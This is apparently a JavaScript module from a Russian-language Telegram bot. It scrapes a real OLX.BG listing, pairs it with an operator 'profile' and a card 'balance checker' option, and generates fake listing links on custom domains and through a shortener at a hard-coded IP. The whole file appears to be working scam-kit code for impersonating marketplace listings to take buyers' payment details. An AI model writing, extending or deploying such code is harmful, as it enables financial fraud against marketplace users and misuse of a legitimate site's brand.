const WizardScene = require("telegraf/scenes/wizard");
const { Request, Ad, Service, MyDomains,Profiles } = require("../../database");
const locale = require("../../locale");
const escapeHTML = require("escape-html");
const { Markup } = require("telegraf");
const log = require("../../helpers/log");
const cheerio = require("cheerio");
const { default: axios } = require("axios");
const rand = require("../../helpers/rand");
const myAd = require("../../commands/myAd");

const olx_bg_domains = ["www.olx.bg", "m.olx.bg", "olx.bg"];

const scene = new WizardScene(
  "create_link_olx_bg",
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "olx_bg",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, "перешёл к созданию ссылки OLX.BG");
      return ctx.wizard.nextStep();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      await ctx.scene.reply("Отправьте ссылку на объявление OLX.BG", {
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("Отменить", "cancel")],
        ]),
      });
      ctx.scene.state.data = {};
      return ctx.wizard.next();
    } catch (err) {
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!ctx.message.text) return ctx.wizard.prevStep();
      var url;
      try {
        url = new URL(ctx.message.text);
      } catch (err) {
        await ctx.replyOrEdit("❌ Введите валидную ссылку").catch((err) => err);
        return ctx.wizard.prevStep();
      }
      if (!olx_bg_domains.includes(url.host)) {
        await ctx
          .replyOrEdit("❌ Введите ссылку на объявление OLX.BG")
          .catch((err) => err);
        return ctx.wizard.prevStep();
      }
      url.host = url.host
        .replace("m.olx.bg", "olx.bg")
        .replace("olx.bg/oferta", "olx.bg/d/oferta");
      url.hostname = url.host;

      log(ctx, `отправил ссылку для парсинга OLX.BG (${url.href})`);

      await ctx.scene.reply("🔄 Парсим объявление...").catch((err) => err);
  const ad = await axios.get(encodeURI(url.href), {
  headers: {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
    "Accept":
      "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.9",
    "Accept-Encoding": "gzip, deflate, br",
    "Connection": "keep-alive",
    "Upgrade-Insecure-Requests": "1",
    "Cache-Control": "max-age=0",
    "Referer": "https://www.google.com/", // можно изменить под нужный сайт
    "Sec-Fetch-Dest": "document",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Site": "cross-site",
    "Sec-Fetch-User": "?1"
  },
});
     const $    = cheerio.load(ad.data);

      
        const info = {
          title: $('.css-10ofhqw').text().trim(),
          price: $('.css-fqcbii').text().trim(),
          adLink: url.href,
      };
      try {
        info.photo = $(".swiper-zoom-container img").first().attr("src");
      } catch (err) {}

      if (!info.title || !info.price) {
        await ctx.scene
          .reply("❌ Не удалось спарсить объявление")
          .catch((err) => err);
        return ctx.scene.leave();
      }
      log(ctx, `спарсил объявление OLX.BG (${url.href})`);
      ctx.scene.state.data = info;
      
     
          const profiles = await Profiles.findAll({where: {userId: ctx.from.id}})
    
          var buttons = profiles.map((v) => [
            Markup.callbackButton(v.title, v.id)
          ])
    
          await ctx.scene
          .reply(`Выберите профиль`, {
            reply_markup: Markup.inlineKeyboard([
              ...buttons,
              [Markup.callbackButton("Отменить", "cancel")],
            ])
          })
          return ctx.wizard.next()
        } catch (err) {
          ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
          return ctx.scene.leave();
        } 
      },
     
      async (ctx) => {
        try {
          const profiles = await Profiles.findOne({where: {id: ctx.callbackQuery.data}})
          
          ctx.scene.state.data.address = profiles.address
          ctx.scene.state.data.name = profiles.name
          ctx.scene.state.data.phone = profiles.phone
      await ctx.scene
        .reply("Чекер баланса", {
          reply_markup: Markup.inlineKeyboard([
            [
              Markup.callbackButton("Включить", "true"),
              Markup.callbackButton("Выключить", "false"),
            ],
            [Markup.callbackButton("Отменить", "cancel")],
          ]),
        })
        .catch((err) => err);
      return ctx.wizard.next();
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      if (!["true", "false"].includes(ctx.callbackQuery.data)) return ctx.wizard.prevStep();
      ctx.scene.state.data.balanceChecker = ctx.callbackQuery.data == "true";
      return ctx.wizard.nextStep()
    } catch (err) {
      console.log(err)
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
      return ctx.scene.leave();
    }
  },
  async (ctx) => {
    try {
      const service = await Service.findOne({
        where: {
          code: "olx_bg",
        },
      });
      if (!service) {
        await ctx.scene.reply("❌ Сервис не существует").catch((err) => err);
        return ctx.scene.leave();
      }
      const ad = await Ad.create({
        id: parseInt(rand(999999, 99999999) + new Date().getTime() / 10000),
        userId: ctx.from.id,
        ...ctx.scene.state.data,
        serviceCode: "olx_bg",
      });

   
      log(
        ctx,
        `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`
      );
      const domains = await MyDomains.findOne({ 
        where: { userId: ctx.from.id }, 
        }); 
        
        let reductionUrl; 
        
        try { 
        const reduction = await axios.post( 
        "http://185.208.158.144/api/create", 
        { 
        target: `https://${service.domain}/${ad.id}`, 
        domain: service.shortlink || ctx.state.bot.shortlink, 
        }, 
        { timeout: 2000 } 
        ); 
        
        reductionUrl = reduction.data.url; 
        } catch (error) { 
        console.error("Ошибка при создании сокращенной ссылки:", error.message); 
        
        if (error.code === 'ECONNABORTED') { 
        console.warn("Запрос превысил допустимый тайм-аут."); 
        } else if (error.code === 'ECONNREFUSED' || error.code === 'ENOTFOUND') { 
        console.warn("Сервер сокращений недоступен."); 
        } else { 
        console.warn("Произошла непредвиденная ошибка:", error.message); 
        } 
        
        reductionUrl = null; // корректный fallback 
        } 
        
        const personalDomainLink = domains ? `https://${domains.domain}/${ad.id}` : null; 
        
        await ad.update({ 
        myDomainLink: personalDomainLink, 
        shortLink: reductionUrl, // используем переменную 
        }); 
        
log(ctx, `создал объявление ${service.title} <code>(ID: ${ad.id})</code>`); 

// Собираем сообщение 
try {
  await myAd(ctx, ad.id);
} catch (err) {
  await ctx.replyOrEdit("❌ Ошибка при отображении объявления.").catch(() => {});
}
      ctx.updateType = "message";
    } catch (err) {
      console.log(err);
      ctx.replyOrEdit("❌ Ошибка").catch((err) => err);
    }
    return ctx.scene.leave();
  }
);

module.exports = scene;
